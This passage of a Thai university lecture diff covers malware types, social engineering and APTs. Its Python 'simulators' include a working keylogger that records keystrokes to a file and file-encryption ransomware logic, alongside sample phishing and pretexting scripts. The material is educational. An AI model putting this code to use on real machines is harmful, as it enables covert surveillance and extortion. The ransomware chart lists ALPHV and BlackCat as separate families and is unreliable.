@@ -1,0 +1,2854 @@
+# Week 2: Cyber Threat Types & Malware
+## ENGSE214 – Introduction to Cyber Security
+
+---
+
+## 📋 สารบัญ (Table of Contents)
+
+1. [ภาพรวมบทเรียน](#overview)
+2. [ประเภทของภัยคุกคาม (Threat Classification)](#threat-classification)
+3. [Malware และประเภทต่างๆ](#malware-types)
+4. [Social Engineering](#social-engineering)
+5. [Advanced Persistent Threats (APT)](#apt)
+6. [Case Studies](#case-studies)
+7. [Hands-on Demonstrations](#demonstrations)
+8. [แบบฝึกหัดและคำถามชวนคิด](#exercises)
+9. [สรุปและแนวทางป้องกัน](#summary)
+
+---
+
+## 🎯 <a name="overview"></a>ภาพรวมบทเรียน (Learning Objectives)
+
+### จุดประสงค์การเรียนรู้
+หลังจากเรียนสัปดาห์นี้ นักศึกษาจะสามารถ:
+
+1. **จำแนกประเภทของภัยคุกคาม** ทางไซเบอร์ที่แตกต่างกัน
+2. **อธิบายลักษณะและพฤติกรรม** ของ Malware แต่ละประเภท
+3. **วิเคราะห์เทคนิค Social Engineering** และวิธีป้องกัน
+4. **เข้าใจแนวคิดของ APT** และผลกระทบต่อองค์กร
+5. **ประยุกต์ใช้ความรู้** ในการวิเคราะห์เหตุการณ์โจมตีจริง
+
+### เวลาที่ใช้
+- **Lecture**: 90 นาที
+- **Case Study & Group Discussion**: 45 นาที
+- **Demo & Q&A**: 30 นาที
+- **รวม**: 2.5-3 ชั่วโมง
+
+### CLO Mapping
+- **CLO1**: อธิบายแนวคิดพื้นฐานและหลักการด้านความมั่นคงปลอดภัยทางไซเบอร์
+- **CLO2**: วิเคราะห์ภัยคุกคามและช่องโหว่ในระบบคอมพิวเตอร์และเครือข่าย
+
+---
+
+## 🎭 <a name="threat-classification"></a>ประเภทของภัยคุกคาม (Threat Classification)
+
+### 💭 คำถามชวนคิด
+> "ในยุคที่เราใช้ชีวิตดิจิทัลมากขึ้น ภัยคุกคามที่เราเจอวันนี้ต่างจากเมื่อ 10 ปีก่อนอย่างไร?"
+
+### การจำแนกภัยคุกคามตามวัตถุประสงค์
+
+```
+┌───────────────────────────────────────────────────────────┐
+│                  CYBER THREAT LANDSCAPE                   │
+├───────────────────────────────────────────────────────────┤
+│                                                           │
+│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
+│  │   MALWARE    │  │    SOCIAL    │  │  PHYSICAL    │     │
+│  │              │  │  ENGINEERING │  │    ATTACK    │     │
+│  │  • Virus     │  │              │  │              │     │
+│  │  • Worm      │  │  • Phishing  │  │  • Theft     │     │
+│  │  • Trojan    │  │  • Pretexting│  │  • Sabotage  │     │
+│  │  • Ransomware│  │  • Baiting   │  │  • Tampering │     │
+│  │  • Spyware   │  │  • Quid Pro  │  │              │     │
+│  │  • Rootkit   │  │    Quo       │  │              │     │
+│  └──────────────┘  └──────────────┘  └──────────────┘     │
+│                                                           │
+│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
+│  │   NETWORK    │  │     WEB      │  │     APT      │     │
+│  │    ATTACK    │  │    ATTACK    │  │              │     │
+│  │              │  │              │  │  • Targeted  │     │
+│  │  • DoS/DDoS  │  │  • SQLi      │  │  • Persistent│     │
+│  │  • MITM      │  │  • XSS       │  │  • Stealthy  │     │
+│  │  • Sniffing  │  │  • CSRF      │  │  • Multi-    │     │
+│  │  • Spoofing  │  │  • Code Inj. │  │    stage     │     │
+│  └──────────────┘  └──────────────┘  └──────────────┘     │
+│                                                           │
+└───────────────────────────────────────────────────────────┘
+```
+
+### การจำแนกตามระดับความซับซ้อน
+
+| ระดับ | ประเภทภัยคุกคาม | ทักษะที่ต้องการ | ตัวอย่าง |
+|-------|-----------------|------------------|----------|
+| **Low** | Script Kiddies | ต่ำ - ใช้เครื่องมือสำเร็จรูป | การใช้ Metasploit สำเร็จรูป |
+| **Medium** | Organized Crime | ปานกลาง - ปรับแต่ง exploit | Ransomware-as-a-Service |
+| **High** | Nation-State APT | สูง - พัฒนา 0-day exploit | Stuxnet, APT29 |
+
+### การจำแนกตามเป้าหมาย (CIA Triad Impact)
+
+```
+        THREAT IMPACT ON CIA TRIAD
+        
+Confidentiality     Integrity        Availability
+     Breach          Violation         Loss
+        │                │                │
+        ▼                ▼                ▼
+    ┌──────────┐       ┌──────────┐      ┌────────┐
+    │Data      │       │Data      │      │Service │
+    │Theft     │       │Tampering │      │Denial  │
+    │          │       │          │      │        │
+    │• Spyware │       │• Virus   │      │• DDoS  │
+    │• Keylog  │       │• Trojans │      │• Ransom│
+    │• Phishing│       │• Rootkit │      │• Wiper │
+    └──────────┘       └──────────┘      └────────┘
+```
+
+---
+
+## 🦠 <a name="malware-types"></a>Malware และประเภทต่างๆ
+
+### คำนิยาม Malware
+**Malware** (Malicious Software) = ซอฟต์แวร์ที่ออกแบบมาเพื่อทำความเสียหาย ขโมยข้อมูล หรือทำลายระบบ
+
+### 1. **Virus (ไวรัส)**
+
+#### ลักษณะเด่น
+- **ต้องมี Host File**: แนบตัวเองกับโปรแกรมหรือไฟล์
+- **ต้องมีการกระทำ**: ผู้ใช้ต้องรันโปรแกรมที่ติดเชื้อ
+- **สามารถแพร่กระจาย**: ไปยังไฟล์อื่นในระบบเดียวกัน
+
+#### การทำงาน
+```
+┌────────────────────────────────────────────────┐
+│         VIRUS INFECTION CYCLE                  │
+├────────────────────────────────────────────────┤
+│                                                │
+│  1. User Downloads ──┐                         │
+│     Infected File    │                         │
+│                      ▼                         │
+│  2. User Executes ───┐                         │
+│     The File         │                         │
+│                      ▼                         │
+│  3. Virus Code   ────┐                         │
+│     Runs             │                         │
+│                      ▼                         │
+│  4. Virus Seeks  ────┐                         │
+│     Other Files      │                         │
+│                      ▼                         │
+│  5. Infects More ────┐                         │
+│     Files            │                         │
+│                      ▼                         │
+│  6. Payload      ────┘                         │
+│     Executes                                   │
+│                                                │
+└────────────────────────────────────────────────┘
+```
+
+#### ตัวอย่างโค้ด (Python Simulation - Educational Only)
+```python
+# WARNING: นี่คือโค้ดจำลองเพื่อการศึกษาเท่านั้น
+# ห้ามนำไปใช้จริงหรือเผยแพร่
+
+import os
+import shutil
+
+class VirusSimulator:
+    """
+    Virus Simulator - แสดงแนวคิดการทำงานของไวรัส
+    ในความเป็นจริง virus จะซับซ้อนกว่านี้มาก
+    """
+    
+    def __init__(self, signature="INFECTED"):
+        self.signature = signature
+    
+    def is_infected(self, file_path):
+        """ตรวจสอบว่าไฟล์ติดเชื้อแล้วหรือไม่"""
+        try:
+            with open(file_path, 'r') as f:
+                content = f.read()
+                return self.signature in content
+        except:
+            return False
+    
+    def infect_file(self, file_path):
+        """จำลองการติดเชื้อไฟล์"""
+        if not self.is_infected(file_path):
+            try:
+                with open(file_path, 'a') as f:
+                    f.write(f"\n# {self.signature}\n")
+                print(f"[SIMULATION] Infected: {file_path}")
+            except:
+                print(f"[SIMULATION] Cannot infect: {file_path}")
+    
+    def payload(self):
+        """Payload - สิ่งที่ไวรัสจะทำหลังติดเชื้อ"""
+        print("[SIMULATION] Payload activated!")
+        print("[SIMULATION] In real virus: steal data, encrypt files, etc.")
+
+# Demo การใช้งาน (ใน sandbox environment)
+if __name__ == "__main__":
+    print("=== Virus Behavior Simulation ===")
+    print("This is EDUCATIONAL demonstration only!\n")
+    
+    virus = VirusSimulator()
+    print("1. Virus created")
+    print("2. Scanning for target files...")
+    print("3. Would infect: .py, .txt, .doc files")
+    print("4. Payload would execute")
+```
+
+#### ตัวอย่างไวรัสในอดีตที่มีชื่อเสียง
+- **ILOVEYOU (2000)**: แพร่กระจายผ่าน email attachment, เสียหาย 10 พันล้านดอลลาร์
+- **Code Red (2001)**: โจมตี IIS web servers, สร้าง backdoor
+- **Melissa (1999)**: แพร่กระจายผ่าน Microsoft Word macro
+
+---
+
+### 2. **Worm (เวิร์ม)**
+
+#### ลักษณะเด่น
+- **ไม่ต้องมี Host File**: สามารถทำงานได้เอง (standalone)
+- **แพร่กระจายอัตโนมัติ**: ไม่ต้องรอให้ผู้ใช้กระทำ
+- **ใช้ช่องโหว่เครือข่าย**: เพื่อแพร่กระจายไปยังเครื่องอื่น
+
+#### การแพร่กระจาย
+```
+    WORM PROPAGATION MODEL
+    
+    [Infected Host]
+           │
+           │ Scans Network
+           ├──────────────┐
+           │              │
+           ▼              ▼
+    [Host A]         [Host B]
+    Exploits         Exploits
+    Vulnerability    Vulnerability
+           │              │
+           ├──────────────┤
+           │              │
+           ▼              ▼
+    [Host C]         [Host D]
+         ...              ...
+         
+    Exponential Growth Pattern:
+    Hour 0:  1 host
+    Hour 1:  2 hosts
+    Hour 2:  4 hosts
+    Hour 3:  8 hosts
+    Hour 4: 16 hosts
+```
+
+#### ตัวอย่างโค้ด Worm Behavior
+```python
+import socket
+import threading
+
+class WormSimulator:
+    """
+    Worm Simulator - แสดงแนวคิดการแพร่กระจายของเวิร์ม
+    WARNING: Educational purpose only!
+    """
+    
+    def __init__(self, target_range="192.168.1.0/24"):
+        self.target_range = target_range
+        self.vulnerable_port = 445  # Example: SMB port
+    
+    def scan_network(self):
+        """สแกนหาเครื่องที่มีช่องโหว่"""
+        print("[SIMULATION] Scanning network for vulnerable hosts...")
+        vulnerable_hosts = [
+            "192.168.1.10",
+            "192.168.1.20",
+            "192.168.1.30"
+        ]
+        return vulnerable_hosts
+    
+    def exploit_vulnerability(self, host):
+        """พยายามใช้ช่องโหว่ในเครื่องเป้าหมาย"""
+        print(f"[SIMULATION] Attempting to exploit {host}...")
+        print(f"[SIMULATION] Would use exploit code here")
+        print(f"[SIMULATION] Would copy self to {host}")
+        print(f"[SIMULATION] Would execute on {host}")
+    
+    def propagate(self):
+        """แพร่กระจายไปยังเครื่องอื่น"""
+        targets = self.scan_network()
+        for target in targets:
+            thread = threading.Thread(
+                target=self.exploit_vulnerability,
+                args=(target,)
+            )
+            thread.start()
+
+# Demo
+if __name__ == "__main__":
+    print("=== Worm Propagation Simulation ===\n")
+    worm = WormSimulator()
+    worm.propagate()
+```
+
+#### Case Study: WannaCry Ransomware Worm (2017)
+
+**ภาพรวม:**
+- แพร่กระจายผ่านช่องโหว่ EternalBlue (MS17-010)
+- เข้ารหัสไฟล์และเรียกค่าไถ่ Bitcoin
+- ส่งผลกระทบ 200,000+ เครื่องใน 150+ ประเทศ
+
+**Timeline:**
+```
+May 12, 2017
+┌─────────────────────────────────────────┐
+│ 08:00 UTC: First infections detected    │
+│ 12:00 UTC: Spreading rapidly globally   │
+│ 15:00 UTC: NHS (UK) severely affected   │
+│ 18:00 UTC: Kill switch discovered       │
+│ 21:00 UTC: Propagation slowed down      │
+└─────────────────────────────────────────┘
+
+Impact:
+• NHS: 19,000+ appointments cancelled
+• Renault: Production halted
+• FedEx: Operations disrupted
+• Total damage: $4 billion USD
+```
+
+---
+
+### 3. **Trojan (โทรจัน)**
+
+#### ลักษณะเด่น
+- **ปลอมตัวเป็นซอฟต์แวร์ปกติ**: เช่น เกม, ยูทิลิตี้
+- **ไม่แพร่กระจายเอง**: ต้องอาศัยผู้ใช้ติดตั้ง
+- **มี Backdoor**: เปิดช่องทางให้ attacker เข้าถึงระบบ
+
+#### ประเภทของ Trojan
+```
+┌────────────────────────────────────────┐
+│        TYPES OF TROJANS                │
+├────────────────────────────────────────┤
+│                                        │
+│ 1. Backdoor Trojan                     │
+│    └─> Remote Access (RAT)             │
+│                                        │
+│ 2. Banking Trojan                      │
+│    └─> Steal financial credentials     │
+│                                        │
+│ 3. Downloader Trojan                   │
+│    └─> Download more malware           │
+│                                        │
+│ 4. Infostealer Trojan                  │
+│    └─> Collect system information      │
+│                                        │
+│ 5. Rootkit Trojan                      │
+│    └─> Hide malicious activities       │
+│                                        │
+│ 6. DDoS Trojan                         │
+│    └─> Participate in DDoS attacks     │
+│                                        │
+└────────────────────────────────────────┘
+```
+
+#### Remote Access Trojan (RAT) Architecture
+```
+        ATTACKER                        VICTIM
+    ┌──────────────┐               ┌─────────────┐
+    │  C&C Server  │               │Trojan Client│
+    │              │               │  (Hidden)   │
+    │  Commands:   │◄─────────────►│             │
+    │  • Keylog    │   Internet    │  Actions:   │
+    │  • Screenshot│               │  • Execute  │
+    │  • Download  │               │  • Upload   │
+    │  • Upload    │               │  • Spy      │
+    └──────────────┘               └─────────────┘
+```
+
+#### ตัวอย่าง Banking Trojan Concept
+```python
+class BankingTrojanSimulator:
+    """
+    Banking Trojan Simulator - แสดงแนวคิดการทำงาน
+    Educational purpose only - DO NOT use in real systems
+    """
+    
+    def __init__(self):
+        self.target_sites = [
+            "bank.com",
+            "paypal.com",
+            "stripe.com"
+        ]
+        self.captured_credentials = []
+    
+    def monitor_browser(self):
+        """จำลองการตรวจสอบ browser activity"""
+        print("[SIMULATION] Monitoring browser activity...")
+        print("[SIMULATION] Waiting for banking websites...")
+    
+    def inject_fake_form(self, url):
+        """จำลองการแทรก fake login form"""
+        if any(site in url for site in self.target_sites):
+            print(f"[SIMULATION] Detected banking site: {url}")
+            print("[SIMULATION] Injecting fake login form...")
+            print("[SIMULATION] Waiting for user credentials...")
+    
+    def capture_credentials(self, username, password):
+        """จำลองการขโมย credentials"""
+        print(f"[SIMULATION] Captured credentials!")
+        self.captured_credentials.append({
+            'username': username,
+            'password': '****' + password[-4:],  # แสดงแค่ 4 ตัวท้าย
+            'timestamp': '2024-01-15 10:30:00'
+        })
+    
+    def send_to_attacker(self):
+        """ส่งข้อมูลไปยัง C&C server"""
+        print("[SIMULATION] Sending data to C&C server...")
+        print(f"[SIMULATION] Total credentials stolen: {len(self.captured_credentials)}")
+
+# Demo
+if __name__ == "__main__":
+    print("=== Banking Trojan Behavior Simulation ===\n")
+    trojan = BankingTrojanSimulator()
+    trojan.monitor_browser()
+    trojan.inject_fake_form("https://bank.com/login")
+    trojan.capture_credentials("user@example.com", "password123")
+    trojan.send_to_attacker()
+```
+
+---
+
+### 4. **Ransomware (แรนซัมแวร์)**
+
+#### ลักษณะเด่น
+- **เข้ารหัสไฟล์**: ทำให้ไฟล์ของเหยื่อใช้งานไม่ได้
+- **เรียกค่าไถ่**: ขอเงินเพื่อถอดรหัสไฟล์กลับ
+- **ใช้ Cryptocurrency**: Bitcoin, Monero เพื่อซ่อนตัวตน
+
+#### Ransomware Attack Flow
+```
+┌─────────────────────────────────────────────────────────┐
+│           RANSOMWARE ATTACK LIFECYCLE                   │
+├─────────────────────────────────────────────────────────┤
+│                                                         │
+│  Phase 1: INFECTION                                     │
+│  ├─ Phishing email / Malicious link / RDP exploit       │
+│  └─ Ransomware installed on system                      │
+│                    │                                    │
+│                    ▼                                    │
+│  Phase 2: EXECUTION                                     │
+│  ├─ Kill antivirus processes                            │
+│  ├─ Delete shadow copies / backups                      │
+│  └─ Start encryption process                            │
+│                    │                                    │
+│                    ▼                                    │
+│  Phase 3: ENCRYPTION                                    │
+│  ├─ Generate unique encryption key                      │
+│  ├─ Encrypt files: .doc, .pdf, .jpg, .db, etc.          │
+│  └─ Encrypt key with attacker's public key              │
+│                    │                                    │
+│                    ▼                                    │
+│  Phase 4: NOTIFICATION                                  │
+│  ├─ Display ransom note                                 │
+│  ├─ Provide payment instructions                        │
+│  └─ Set deadline (e.g., 72 hours)                       │
+│                    │                                    │
+│                    ▼                                    │
+│  Phase 5: PAYMENT / RECOVERY                            │
+│  ├─ Victim pays → May/may not get decryption key        │
+│  └─ Victim doesn't pay → Files lost forever             │
+│                                                         │
+└─────────────────────────────────────────────────────────┘
+```
+
+#### ตัวอย่าง Ransomware Encryption Logic
+```python
+from cryptography.fernet import Fernet
+import os
+
+class RansomwareSimulator:
+    """
+    Ransomware Simulator - แสดงแนวคิดการเข้ารหัส
+    WARNING: Educational demonstration only!
+    DO NOT use on real systems!
+    """
+    
+    def __init__(self):
+        # Generate encryption key
+        self.key = Fernet.generate_key()
+        self.cipher = Fernet(self.key)
+        self.encrypted_files = []
+    
+    def encrypt_file(self, file_path):
+        """เข้ารหัสไฟล์เดียว"""
+        try:
+            # อ่านไฟล์ต้นฉบับ
+            with open(file_path, 'rb') as f:
+                data = f.read()
+            
+            # เข้ารหัส
+            encrypted_data = self.cipher.encrypt(data)
+            
+            # เขียนทับไฟล์เดิม
+            with open(file_path, 'wb') as f:
+                f.write(encrypted_data)
+            
+            # เปลี่ยนชื่อไฟล์
+            new_name = file_path + '.locked'
+            os.rename(file_path, new_name)
+            
+            self.encrypted_files.append(new_name)
+            print(f"[SIMULATION] Encrypted: {file_path}")
+            
+        except Exception as e:
+            print(f"[SIMULATION] Error encrypting {file_path}: {e}")
+    
+    def display_ransom_note(self):
+        """แสดง ransom note"""
+        note = """
+╔════════════════════════════════════════════════╗
+║         YOUR FILES HAVE BEEN ENCRYPTED         ║
+╠════════════════════════════════════════════════╣
+║                                                ║
+║  All your important files have been encrypted! ║
+║                                                ║
+║  To recover your files, you must pay:          ║
+║  0.5 Bitcoin (~$20,000 USD)                    ║
+║                                                ║
+║  Bitcoin Address: 1ABC...XYZ                   ║
+║                                                ║
+║  You have 72 hours to pay.                     ║
+║  After that, the decryption key will be        ║
+║  deleted permanently!                          ║
+║                                                ║
+║  Encrypted files: {count}                      ║
+║                                                ║
+╚════════════════════════════════════════════════╝
+        """.format(count=len(self.encrypted_files))
+        
+        print(note)
+    
+    def decrypt_file(self, file_path, key):
+        """ถอดรหัสไฟล์ (เมื่อได้รับ key)"""
+        try:
+            cipher = Fernet(key)
+            
+            with open(file_path, 'rb') as f:
+                encrypted_data = f.read()
+            
+            decrypted_data = cipher.decrypt(encrypted_data)
+            
+            # เอาสกุล .locked ออก
+            original_name = file_path.replace('.locked', '')
+            
+            with open(original_name, 'wb') as f:
+                f.write(decrypted_data)
+            
+            os.remove(file_path)
+            print(f"[SIMULATION] Decrypted: {original_name}")
+            
+        except Exception as e:
+            print(f"[SIMULATION] Decryption failed: {e}")
+
+# Demo - ใช้ในสภาพแวดล้อม sandbox เท่านั้น!
+if __name__ == "__main__":
+    print("=== Ransomware Encryption Simulation ===")
+    print("This demonstrates the concept only!\n")
+    
+    # สร้าง test file
+    test_file = "/tmp/test_document.txt"
+    with open(test_file, 'w') as f:
+        f.write("This is important data!")
+    
+    # จำลอง ransomware
+    ransomware = RansomwareSimulator()
+    
+    print("1. Original file created")
+    print(f"2. Encrypting {test_file}...")
+    ransomware.encrypt_file(test_file)
+    
+    print("\n3. Displaying ransom note...")
+    ransomware.display_ransom_note()
+    
+    print("\n4. Demonstration of decryption (if key provided)...")
+    ransomware.decrypt_file(test_file + '.locked', ransomware.key)
+    
+    # Cleanup
+    if os.path.exists(test_file):
+        os.remove(test_file)
+```
+
+#### สถิติ Ransomware ปี 2023
+```
+TOP RANSOMWARE FAMILIES (2023)
+
+1. LockBit    ████████████████████ 25%
+2. ALPHV      ████████████████     20%
+3. BlackCat   █████████████        16%
+4. Cl0p       ██████████           12%
+5. Royal      ████████              10%
+6. Others     █████████████████     17%
+
+Average Ransom Demanded: $1.5 Million USD
+Average Recovery Cost: $4.5 Million USD
+```
+
+---
+
+### 5. **Spyware (สปายแวร์)**
+
+#### ลักษณะเด่น
+- **ติดตามพฤติกรรมผู้ใช้**: เว็บไซต์ที่เข้า, keystroke, screenshot
+- **ขโมยข้อมูล**: รหัสผ่าน, เลขบัตรเครดิต, ข้อมูลส่วนตัว
+- **ทำงานแบบเงียบ**: ไม่แสดงตัว, ไม่ทำให้ระบบช้า
+
+#### ประเภทของ Spyware
+```
+SPYWARE CATEGORIES
+│
+├─ 1. Keylogger
+│  └─> บันทึกทุก keystroke
+│      Application: Banking, Email, Password
+│
+├─ 2. Screen Recorder
+│  └─> บันทึกหน้าจอ
+│      Application: Confidential documents
+│
+├─ 3. Browser Hijacker
+│  └─> เปลี่ยน homepage, search engine
+│      Application: Redirect traffic
+│
+├─ 4. Webcam/Microphone Spy
+│  └─> เข้าถึง webcam/mic
+│      Application: Surveillance
+│
+└─ 5. Mobile Spyware
+   └─> ตรวจสอบ GPS, SMS, Calls
+       Application: Stalkerware
+```
+
+#### Keylogger Example
+```python
+from pynput import keyboard
+from datetime import datetime
+
+class KeyloggerSimulator:
+    """
+    Keylogger Simulator - แสดงแนวคิดการบันทึก keystroke
+    WARNING: Educational purpose only!
+    Using keyloggers without consent is ILLEGAL!
+    """
+    
+    def __init__(self, log_file="keylog.txt"):
+        self.log_file = log_file
+        self.keys_pressed = []
+    
+    def on_press(self, key):
+        """เมื่อมีการกดปุ่ม"""
+        try:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
+            # บันทึก key
+            if hasattr(key, 'char'):
+                self.keys_pressed.append(key.char)
+                log_entry = f"[{timestamp}] Key: {key.char}\n"
+            else:
+                log_entry = f"[{timestamp}] Special: {key}\n"
+            
+            # เขียนลง log file
+            with open(self.log_file, 'a') as f:
+                f.write(log_entry)
+            
+            print(f"[SIMULATION] Logged: {log_entry.strip()}")
+            
+        except Exception as e:
+            print(f"[SIMULATION] Error: {e}")
+    
+    def start_logging(self):
+        """เริ่มบันทึก (ในความเป็นจริงจะทำงานแบบ hidden)"""
+        print("[SIMULATION] Keylogger started...")
+        print("[SIMULATION] Press ESC to stop (in real malware, no way to stop!)")
+        
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            listener.join()
+    
+    def analyze_captured_data(self):
+        """วิเคราะห์ข้อมูลที่บันทึกได้"""
+        print("\n[SIMULATION] Analyzing captured data...")
+        
+        # ค้นหา patterns
+        captured_text = ''.join(self.keys_pressed)
+        
+        # ตัวอย่างการหา password pattern
+        if 'password' in captured_text.lower():
+            print("[SIMULATION] Potential password detected!")
+        
+        # ตัวอย่างการหา email
+        if '@' in captured_text and '.com' in captured_text:
+            print("[SIMULATION] Email address detected!")
+        
+        # ตัวอย่างการหา credit card
+        digits = ''.join([c for c in captured_text if c.isdigit()])
+        if len(digits) == 16:
+            print("[SIMULATION] Possible credit card number detected!")
+
+# Demo - สำหรับการศึกษาเท่านั้น
+if __name__ == "__main__":
+    print("=== Keylogger Demonstration ===")
+    print("This shows how keyloggers work")
+    print("Using keyloggers without permission is ILLEGAL!\n")
+    
+    # keylogger = KeyloggerSimulator()
+    # keylogger.start_logging()  # Uncomment to test (in controlled environment)
+```
+
+---
+
+## 🎭 <a name="social-engineering"></a>Social Engineering
+
+### คำนิยาม
+**Social Engineering** = การหลอกลวงทางจิตวิทยาเพื่อให้เหยื่อทำสิ่งที่ต้องการหรือเปิดเผยข้อมูลลับ
+
+### 💭 คำถามชวนคิด
+> "ทำไมการโจมตีทางเทคนิคต้องใช้ความพยายามมาก แต่การโทรหลอกแค่ครั้งเดียวก็อาจสำเร็จ?"
+> 
+> **"The weakest link in security is not the computer, but the human behind it."**
+
+### Social Engineering Attack Cycle
+```
+┌──────────────────────────────────────────────┐
+│    SOCIAL ENGINEERING ATTACK CYCLE           │
+├──────────────────────────────────────────────┤
+│                                              │
+│  1. RESEARCH (Information Gathering)         │
+│     └─> Target identification                │
+│     └─> Social media profiling               │
+│     └─> Company information                  │
+│              │                               │
+│              ▼                               │
+│  2. HOOK (Initial Contact)                   │
+│     └─> Build rapport                        │
+│     └─> Establish credibility                │
+│     └─> Create urgency                       │
+│              │                               │
+│              ▼                               │
+│  3. PLAY (Execute Attack)                    │
+│     └─> Request sensitive information        │
+│     └─> Trick into action                    │
+│     └─> Install malware                      │
+│              │                               │
+│              ▼                               │
+│  4. EXIT (Cover Tracks)                      │
+│     └─> Remove evidence                      │
+│     └─> Maintain plausibility                │
+│     └─> Leave backdoor for future            │
+│                                              │
+└──────────────────────────────────────────────┘
+```
+
+### เทคนิค Social Engineering ที่พบบ่อย
+
+#### 1. **Phishing (ฟิชชิ่ง)**
+
+**คำนิยาม:** การส่งอีเมลหรือข้อความปลอมตัวเป็นองค์กรที่น่าเชื่อถือ
+
+**ตัวอย่าง Phishing Email:**
+```
+From: security@paypa1.com (สังเกต: paypa1 ไม่ใช่ paypal)
+To: victim@company.com
+Subject: ⚠️ Urgent: Your account will be suspended!
+
+Dear Valued Customer,
+
+We have detected unusual activity on your PayPal account.
+Your account will be SUSPENDED within 24 hours unless you
+verify your identity immediately.
+
+Click here to verify: http://paypa1-verify.com/login
+
+If you don't verify within 24 hours, your account will be
+permanently closed and funds will be forfeited.
+
+Best regards,
+PayPal Security Team
+
+[Suspicious Link Button]
+```
+
+**Red Flags (สัญญาณเตือน):**
+```
+🚩 Urgent/threatening language
+🚩 Suspicious sender email (paypa1 vs paypal)
+🚩 Hover over link shows different URL
+🚩 Generic greeting ("Dear Customer")
+🚩 Poor grammar/spelling
+🚩 Requests sensitive information
+🚩 Too good to be true offers
+```
+
+#### 2. **Spear Phishing (สเปียร์ฟิชชิ่ง)**
+
+**คำนิยาม:** Phishing ที่มุ่งเป้าเฉพาะบุคคลหรือกลุ่มคน โดยใช้ข้อมูลส่วนตัว
+
+**ตัวอย่าง:**
+```
+From: ceo@yourcompany.com (Spoofed)
+To: finance@yourcompany.com
+Subject: Re: Urgent Wire Transfer
+
+Hi Sarah,
+
+I'm in a meeting with investors and need you to process
+an urgent wire transfer immediately.
+
+Amount: $50,000
+To: ABC Consulting LLC
+Account: 123-456-789
+Bank: International Bank
+
+Please confirm once completed. This is confidential -
+don't discuss with anyone yet.
+
+Thanks,
+John (CEO)
+
+Sent from my iPhone
+```
+
+**ทำไม Spear Phishing อันตราย:**
+- ใช้ชื่อจริง (Sarah, John)
+- อ้างถึงบริบทที่เป็นไปได้ (investor meeting)
+- สร้างความเร่งด่วน
+- ขอความลับ (ทำให้ไม่ verify กับคนอื่น)
+
+#### 3. **Whaling**
+
+**คำนิยาม:** Spear phishing ที่มุ่งเป้าไปที่ผู้บริหารระดับสูง (CEO, CFO)
+
+**ตัวอย่างสถานการณ์:**
+```
+Target: CFO of Fortune 500 company
+Attack Vector: Fake email from CEO
+Content: Request urgent M&A wire transfer
+Result: $100 million lost
+
+Real Case: Crelan Bank (Belgium, 2016)
+Lost: €70 million (~$75M USD)
+```
+
+#### 4. **Pretexting (การสร้างสถานการณ์จำลอง)**
+
+**คำนิยาม:** สร้างเหตุผลหรือสถานการณ์ปลอมเพื่อเข้าถึงข้อมูล
+
+**ตัวอย่าง Phone Call:**
+```
+Attacker: "Hello, this is John from IT Support.
+           We're upgrading the email system and need
+           to verify your credentials."
+
+Victim:   "Oh, okay. What do you need?"
+
+Attacker: "Just your username and password to ensure
+           your account is migrated correctly."
+
+Victim:   "My username is sarah.johnson and 
+           password is..."
+
+[INFORMATION STOLEN]
+```
+
+#### 5. **Baiting (การล่อ)**
+
+**คำนิยาม:** ใช้ของที่น่าสนใจล่อให้เหยื่อกระทำการ
+
+**ตัวอย่าง:**
+- **USB Drop Attack:** ทิ้ง USB ที่ลานจอดรถบริษัท ติดป้าย "Salary Information 2024"
+- **Free WiFi:** ตั้ง fake WiFi hotspot "Company_Guest_WiFi"
+- **QR Code:** ติด QR code "Scan for free coffee" ที่ทำให้โหลด malware
+
+```
+    BAITING ATTACK EXAMPLE
+    
+    [1] Drop USB in parking lot
+         │
+         ▼
+    [2] Employee finds USB
+         │
+         ▼
+    [3] Employee plugs into work computer
+         │
+         ▼
+    [4] Malware auto-executes
+         │
+         ▼
+    [5] Attacker gains network access
+```
+
+#### 6. **Quid Pro Quo (แลกเปลี่ยน)**
+
+**คำนิยาม:** เสนอบริการหรือความช่วยเหลือเพื่อแลกกับข้อมูล
+
+**ตัวอย่าง:**
+```
+Attacker (as IT): "Hi, we're doing a security audit.
+                   If you help us test your password,
+                   we'll give you a $50 gift card."
+
+Victim: "Sure! My password is..."
+
+[CREDENTIAL COMPROMISED]
+```
+
+### Social Engineering ในชีวิตประจำวัน
+
+#### ตัวอย่างสถานการณ์จริงในเมืองไทย
+
+**📱 Case 1: LINE Official Account Scam**
+```
+ได้รับข้อความจาก "LINE Official":
+
+"🎉 ยินดีด้วย! คุณได้รับสิทธิ์ LINE POINT 10,000 คะแนน
+คลิกลิงก์เพื่อรับสิทธิ์: http://line-point.tk/claim"
+
+[Click] → Login with LINE account
+        → Credential stolen
+        → Account compromised
+```
+
+**🏦 Case 2: Fake Bank Call**
+```
+โทรศัพท์มาจาก "ธนาคาร":
+
+"สวัสดีค่ะ จากธนาคารกสิกรไทย มีรายการถอนเงิน
+100,000 บาท ที่ตู้ ATM หาดใหญ่ เมื่อ 10 นาทีที่แล้ว
+ถ้าไม่ใช่คุณ กรุณาแจ้ง OTP เพื่อยกเลิกรายการ"
+
+[Victim gives OTP] → Money transferred out
+```
+
+---
+
+## 🎯 <a name="apt"></a>Advanced Persistent Threats (APT)
+
+### คำนิยาม
+**APT** = การโจมตีที่มีการวางแผนอย่างรอบคอบ มีเป้าหมายเฉพาะ และคงอยู่ในระบบเป็นเวลานาน
+
+### ลักษณะของ APT
+```
+┌───────────────────────────────────────────────┐
+│        APT CHARACTERISTICS                    │
+├───────────────────────────────────────────────┤
+│                                               │
+│  1. TARGETED                                  │
+│     └─> Specific organizations                │
+│     └─> High-value targets                    │
+│     └─> Strategic objectives                  │
+│                                               │
+│  2. PERSISTENT                                │
+│     └─> Long-term presence (months/years)     │
+│     └─> Multiple backdoors                    │
+│     └─> Survives reboots/updates              │
+│                                               │
+│  3. ADVANCED                                  │
+│     └─> Custom malware/0-day exploits         │
+│     └─> Multi-stage attacks                   │
+│     └─> Advanced evasion techniques           │
+│                                               │
+│  4. STEALTHY                                  │
+│     └─> Avoid detection                       │
+│     └─> Low and slow operations               │
+│     └─> Encrypted C&C communications          │
+│                                               │
+└───────────────────────────────────────────────┘
+```
+
+### APT Attack Lifecycle (Cyber Kill Chain)
+```
+┌────────────────────────────────────────────────────────┐
+│            APT ATTACK LIFECYCLE                        │
+│        (Based on Lockheed Martin Cyber Kill Chain)     │
+├────────────────────────────────────────────────────────┤
+│                                                        │
